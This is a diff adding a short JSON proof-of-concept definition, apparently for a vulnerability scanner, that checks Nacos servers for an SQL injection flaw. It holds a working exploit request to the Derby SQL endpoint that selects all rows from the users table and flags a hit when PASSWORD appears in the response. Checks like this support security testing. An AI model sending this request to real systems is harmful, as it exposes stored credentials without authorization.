@@ -1,0 +1,14 @@
+{
+	"name":"nacos_sql注入",
+	"tag":"nacos",
+	"type":"other",
+	"poc":{
+		"pocGet":"/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(PASSWORD)"
+	}
+}
